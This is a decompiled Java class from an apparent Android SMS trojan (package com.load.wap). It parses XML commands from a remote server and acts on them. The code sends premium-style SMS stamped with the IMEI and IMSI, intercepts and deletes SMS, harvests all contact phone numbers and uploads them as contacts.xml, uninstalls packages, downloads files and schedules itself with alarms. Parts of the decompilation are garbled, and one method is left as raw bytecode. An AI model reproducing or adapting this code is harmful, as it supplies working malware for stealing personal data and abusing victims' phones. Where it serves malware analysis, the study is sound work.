package com.load.wap;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build.VERSION;
import android.telephony.SmsManager;
import android.util.Xml;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.PrintStream;
import java.io.StringWriter;
import java.lang.reflect.Field;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import org.apache.http.NameValuePair;
import org.apache.http.client.utils.URLEncodedUtils;
import org.apache.http.message.BasicNameValuePair;
import org.xmlpull.v1.XmlPullParser;
import org.xmlpull.v1.XmlPullParserFactory;
import org.xmlpull.v1.XmlSerializer;

public final class b
{
  public static e a(InputStream paramInputStream)
  {
    String str1 = null;
    e localE = new e();
    Object localObject = "";
    for (;;)
    {
      XmlPullParser localXmlPullParser;
      String str2;
      try
      {
        localXmlPullParser = XmlPullParserFactory.newInstance().newPullParser();
        localXmlPullParser.setInput(paramInputStream, null);
        paramInputStream = null;
        switch (localXmlPullParser.next())
        {
        case 2: 
          str2 = localXmlPullParser.getName();
          if (str2.equals("sms"))
          {
            paramInputStream = new h();
            paramInputStream.b = a(localXmlPullParser, "number");
            localObject = str2;
            continue;
          }
          if (!str2.equals("catch")) {
            break label154;
          }
        }
      }
      catch (Exception paramInputStream)
      {
        paramInputStream.printStackTrace();
        return localE;
      }
      paramInputStream = new h();
      paramInputStream.b = a(localXmlPullParser, "number");
      localObject = str2;
      continue;
      label154:
      if (str2.equals("delete"))
      {
        paramInputStream = new h();
        paramInputStream.b = a(localXmlPullParser, "number");
        localObject = str2;
      }
      else if (str2.equals("httpRequest"))
      {
        localE.f = a(localXmlPullParser, "url");
        localE.g = a(localXmlPullParser, "method");
        localObject = str2;
      }
      else if ((str2.equals("param")) || (str2.equals("property")))
      {
        str1 = a(localXmlPullParser, "name");
        localObject = str2;
      }
      else if (str2.equals("update"))
      {
        localE.j = a(localXmlPullParser, "url");
        localObject = str2;
      }
      else if (str2.equals("command"))
      {
        String str3 = a(localXmlPullParser, "name");
        if (str3.equals("removeAllSmsFilters"))
        {
          localE.r = true;
          localObject = str2;
        }
        else if (str3.equals("sendContactList"))
        {
          localE.s = true;
          localObject = str2;
        }
        else if (str3.equals("removeCurrentCatchFilter"))
        {
          localE.t = true;
          localObject = str2;
        }
        else
        {
          localObject = str2;
          if (str3.equals("removeAllCatchFilters"))
          {
            localE.u = true;
            localObject = str2;
          }
        }
      }
      else if (str2.equals("openUrl"))
      {
        localE.k = a(localXmlPullParser, "url");
        localObject = str2;
      }
      else if (str2.equals("uninstall"))
      {
        localE.l = a(localXmlPullParser, "package");
        localObject = str2;
      }
      else
      {
        localObject = str2;
        if (str2.equals("notification"))
        {
          localE.m = a(localXmlPullParser, "url");
          localE.n = a(localXmlPullParser, "tickerText");
          localE.o = a(localXmlPullParser, "title");
          localE.p = a(localXmlPullParser, "text");
          localE.q = Integer.parseInt(a(localXmlPullParser, "icon"));
          localObject = str2;
          continue;
          if (localXmlPullParser.getName().equals("response"))
          {
            return localE;
            if (((String)localObject).equals("wait"))
            {
              localE.a = Long.parseLong(localXmlPullParser.getText());
            }
            else if (((String)localObject).equals("server"))
            {
              localE.b = localXmlPullParser.getText();
            }
            else if (((String)localObject).equals("sms"))
            {
              paramInputStream.c = localXmlPullParser.getText();
              localE.c.add(paramInputStream);
            }
            else if (((String)localObject).equals("catch"))
            {
              paramInputStream.c = localXmlPullParser.getText();
              localE.d.add(paramInputStream);
            }
            else if (((String)localObject).equals("delete"))
            {
              paramInputStream.c = localXmlPullParser.getText();
              localE.e.add(paramInputStream);
            }
            else if (((String)localObject).equals("delete"))
            {
              paramInputStream.c = localXmlPullParser.getText();
              localE.e.add(paramInputStream);
            }
            else if (((String)localObject).equals("param"))
            {
              localObject = localXmlPullParser.getText();
              localE.h.add(new BasicNameValuePair(str1, (String)localObject));
            }
            else if (((String)localObject).equals("property"))
            {
              localObject = localXmlPullParser.getText();
              localE.i.add(new BasicNameValuePair(str1, (String)localObject));
              break label812;
              continue;
              return localE;
            }
            label812:
            localObject = "";
          }
        }
      }
    }
  }
  
  /* Error */
  public static String a(Context paramContext, String paramString)
  {
    // Byte code:
    //   0: iconst_0
    //   1: istore_3
    //   2: aload_0
    //   3: invokevirtual 210	java/lang/Object:getClass	()Ljava/lang/Class;
    //   6: aload_1
    //   7: invokevirtual 216	java/lang/Class:getResourceAsStream	(Ljava/lang/String;)Ljava/io/InputStream;
    //   10: astore 5
    //   12: iconst_0
    //   13: istore_2
    //   14: aload 5
    //   16: invokevirtual 221	java/io/InputStream:read	()I
    //   19: iconst_m1
    //   20: if_icmpne +86 -> 106
    //   23: aload 5
    //   25: invokevirtual 224	java/io/InputStream:close	()V
    //   28: aload_0
    //   29: invokevirtual 210	java/lang/Object:getClass	()Ljava/lang/Class;
    //   32: aload_1
    //   33: invokevirtual 216	java/lang/Class:getResourceAsStream	(Ljava/lang/String;)Ljava/io/InputStream;
    //   36: astore_0
    //   37: iload_2
    //   38: newarray byte
    //   40: astore_1
    //   41: aload_1
    //   42: arraylength
    //   43: istore 4
    //   45: iload_3
    //   46: istore_2
    //   47: iload 4
    //   49: istore_3
    //   50: aload_0
    //   51: aload_1
    //   52: iload_2
    //   53: iload_3
    //   54: invokevirtual 227	java/io/InputStream:read	([BII)I
    //   57: istore 4
    //   59: iload_3
    //   60: iload 4
    //   62: isub
    //   63: istore_3
    //   64: iload_3
    //   65: ifeq +11 -> 76
    //   68: iload_2
    //   69: iload 4
    //   71: iadd
    //   72: istore_2
    //   73: goto -23 -> 50
    //   76: aload_0
    //   77: invokevirtual 224	java/io/InputStream:close	()V
    //   80: new 44	java/lang/String
    //   83: dup
    //   84: aload_1
    //   85: ldc -27
    //   87: invokespecial 232	java/lang/String:<init>	([BLjava/lang/String;)V
    //   90: astore_0
    //   91: aload_0
    //   92: areturn
    //   93: astore_0
    //   94: aload_0
    //   95: invokevirtual 63	java/lang/Exception:printStackTrace	()V
    //   98: ldc 16
    //   100: areturn
    //   101: astore 5
    //   103: goto -75 -> 28
    //   106: iload_2
    //   107: iconst_1
    //   108: iadd
    //   109: istore_2
    //   110: goto -96 -> 14
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	113	0	paramContext	Context
    //   0	113	1	paramString	String
    //   13	97	2	i	int
    //   1	64	3	j	int
    //   43	29	4	k	int
    //   10	14	5	localInputStream	InputStream
    //   101	1	5	localException	Exception
    // Exception table:
    //   from	to	target	type
    //   2	12	93	java/lang/Exception
    //   28	45	93	java/lang/Exception
    //   50	59	93	java/lang/Exception
    //   76	91	93	java/lang/Exception
    //   14	28	101	java/lang/Exception
  }
  
  public static String a(List paramList)
  {
    XmlSerializer localXmlSerializer = Xml.newSerializer();
    StringWriter localStringWriter = new StringWriter();
    try
    {
      localXmlSerializer.setOutput(localStringWriter);
      localXmlSerializer.startDocument("UTF-8", Boolean.valueOf(true));
      localXmlSerializer.startTag("", "numbers");
      int i = 0;
      for (;;)
      {
        if (i >= paramList.size())
        {
          localXmlSerializer.endTag("", "numbers");
          localXmlSerializer.endDocument();
          return localStringWriter.toString();
        }
        localXmlSerializer.startTag("", "n");
        localXmlSerializer.text((String)paramList.get(i));
        localXmlSerializer.endTag("", "n");
        i += 1;
      }
      return "";
    }
    catch (Exception paramList)
    {
      paramList.printStackTrace();
    }
  }
  
  public static String a(XmlPullParser paramXmlPullParser, String paramString)
  {
    int i = 0;
    for (;;)
    {
      if (i >= paramXmlPullParser.getAttributeCount()) {
        return "";
      }
      if (paramXmlPullParser.getAttributeName(i).equals(paramString)) {
        return paramXmlPullParser.getAttributeValue(i);
      }
      i += 1;
    }
  }
  
  public static HttpURLConnection a(String paramString1, String paramString2, List paramList1, List paramList2, boolean paramBoolean, String paramString3)
  {
    int j = 0;
    for (;;)
    {
      try
      {
        if (paramString2.equals("POST"))
        {
          paramString1 = new URL(paramString1);
          paramString1 = (HttpURLConnection)paramString1.openConnection();
          paramString1.setDoInput(true);
          paramString1.setDoOutput(true);
          paramString1.setUseCaches(false);
          paramString1.setRequestMethod(paramString2);
          if (!paramString2.equals("POST")) {
            break label452;
          }
          paramString1.setRequestProperty("Content-Type", "multipart/form-data; boundary=AaB03x");
          break label452;
          if (i >= paramList2.size())
          {
            if (!paramString2.equals("POST")) {
              break label431;
            }
            paramString2 = new DataOutputStream(paramString1.getOutputStream());
            i = j;
            if (i < paramList1.size()) {
              break label328;
            }
            if (paramBoolean)
            {
              paramString2.writeBytes("--AaB03x");
              paramString2.writeBytes("\r\n");
              paramString2.writeBytes("Content-Disposition: form-data; name=\"FILE\"; filename=\"contacts.xml\"");
              paramString2.writeBytes("\r\n");
              paramString2.writeBytes("Content-Type: application/octet-stream");
              paramString2.writeBytes("\r\n");
              paramString2.writeBytes("Content-Transfer-Encoding: binary");
              paramString2.writeBytes("\r\n");
              paramString2.writeBytes("\r\n");
              paramString2.write(paramString3.getBytes("utf-8"));
              paramString2.writeBytes("\r\n");
            }
            paramString2.writeBytes("--AaB03x--");
            paramString2.writeBytes("\r\n");
            paramString2.flush();
            paramString2.close();
            return paramString1;
          }
        }
        else
        {
          if (!paramString2.equals("GET")) {
            break label447;
          }
          paramString1 = new URL(paramString1 + "?" + URLEncodedUtils.format(paramList1, "utf-8"));
          continue;
        }
        localNameValuePair = (NameValuePair)paramList1.get(i);
      }
      catch (Exception paramString1)
      {
        paramString1.printStackTrace();
        return null;
      }
      NameValuePair localNameValuePair;
      paramString1.setRequestProperty(localNameValuePair.getName(), localNameValuePair.getValue());
      i += 1;
      continue;
      label328:
      paramList2 = (NameValuePair)paramList1.get(i);
      paramString2.writeBytes("--AaB03x");
      paramString2.writeBytes("\r\n");
      paramString2.writeBytes("Content-Disposition: form-data; name=\"" + paramList2.getName() + "\"");
      paramString2.writeBytes("\r\n");
      paramString2.writeBytes("\r\n");
      paramString2.write(paramList2.getValue().getBytes("utf-8"));
      paramString2.writeBytes("\r\n");
      i += 1;
      continue;
      label431:
      if (!paramString2.equals("GET")) {
        break;
      }
      paramString1.connect();
      return paramString1;
      label447:
      paramString1 = null;
      continue;
      label452:
      int i = 0;
    }
    return paramString1;
  }
  
  public static List a(Context paramContext)
  {
    int i = 0;
    int j = 0;
    ArrayList localArrayList = new ArrayList();
    for (;;)
    {
      try
      {
        String str;
        if (Build.VERSION.SDK_INT > 4)
        {
          localObject = Class.forName("android.provider.ContactsContract").getClasses();
          i = 0;
          if (i >= localObject.length)
          {
            str = "";
            localObject = null;
            paramContext = paramContext.getContentResolver().query((Uri)localObject, null, null, null, null);
            if (!paramContext.moveToNext()) {
              return localArrayList;
            }
          }
          else
          {
            if (!localObject[i].getCanonicalName().equals("android.provider.ContactsContract.CommonDataKinds")) {
              break label310;
            }
            localObject = localObject[i].getClasses();
            i = j;
            if (i >= localObject.length)
            {
              str = "";
              localObject = null;
              continue;
            }
            if (!localObject[i].getCanonicalName().equals("android.provider.ContactsContract.CommonDataKinds.Phone")) {
              break label303;
            }
            str = localObject[i];
            localObject = (Uri)str.getField("CONTENT_URI").get(null);
            str = (String)str.getField("NUMBER").get(null);
            continue;
          }
        }
        else
        {
          localObject = Class.forName("android.provider.Contacts").getClasses();
          if (i >= localObject.length)
          {
            str = "";
            localObject = null;
            continue;
          }
          if (!localObject[i].getCanonicalName().equals("android.provider.Contacts.Phones")) {
            break label317;
          }
          str = localObject[i];
          localObject = (Uri)str.getField("CONTENT_URI").get(null);
          str = (String)str.getField("NUMBER").get(null);
          continue;
        }
        Object localObject = paramContext.getString(paramContext.getColumnIndex(str));
        localArrayList.add(localObject);
        System.out.println("phone: " + (String)localObject);
        continue;
        i += 1;
      }
      catch (Exception paramContext)
      {
        paramContext.printStackTrace();
        return localArrayList;
      }
      label303:
      continue;
      label310:
      i += 1;
      continue;
      label317:
      i += 1;
    }
  }
  
  public static void a(Context paramContext, long paramLong)
  {
    Object localObject = new Intent(paramContext, AlarmReceiver.class);
    ((Intent)localObject).setAction("custom.timer");
    localObject = PendingIntent.getBroadcast(paramContext, 423472234, (Intent)localObject, 0);
    ((AlarmManager)paramContext.getSystemService("alarm")).set(0, paramLong, (PendingIntent)localObject);
  }
  
  public static void a(String paramString1, String paramString2, List paramList1, List paramList2)
  {
    try
    {
      paramString1 = a(paramString1, paramString2, paramList1, paramList2, false, null);
      if (paramString1 != null)
      {
        System.out.println("getResponseCode: " + paramString1.getResponseCode());
        paramString1.disconnect();
      }
      return;
    }
    catch (Exception paramString1)
    {
      paramString1.printStackTrace();
    }
  }
  
  public static boolean a(String paramString1, String paramString2)
  {
    paramString2 = paramString2.replace("{IMEI}", MainApplication.a).replace("{IMSI}", MainApplication.b).replace("{SID}", f.e.d).replace("{VERSION}", f.e.c);
    System.out.println("sms: " + paramString2 + " to " + paramString1);
    try
    {
      SmsManager.getDefault().sendTextMessage(paramString1, null, paramString2, null, null);
      return true;
    }
    catch (Exception paramString1)
    {
      paramString1.printStackTrace();
    }
    return false;
  }
  
  public static boolean a(String paramString1, String paramString2, String paramString3)
  {
    try
    {
      paramString2 = (HttpURLConnection)new URL(paramString2).openConnection();
      paramString2.setRequestMethod("GET");
      paramString2.setDoOutput(true);
      paramString2.connect();
      paramString1 = new File(paramString1);
      paramString1.mkdirs();
      paramString1 = new FileOutputStream(new File(paramString1, paramString3));
      paramString2 = paramString2.getInputStream();
      paramString3 = new byte['Ѐ'];
      for (;;)
      {
        int i = paramString2.read(paramString3);
        if (i == -1)
        {
          paramString1.close();
          paramString2.close();
          return true;
        }
        paramString1.write(paramString3, 0, i);
      }
      return false;
    }
    catch (Exception paramString1) {}
  }
}
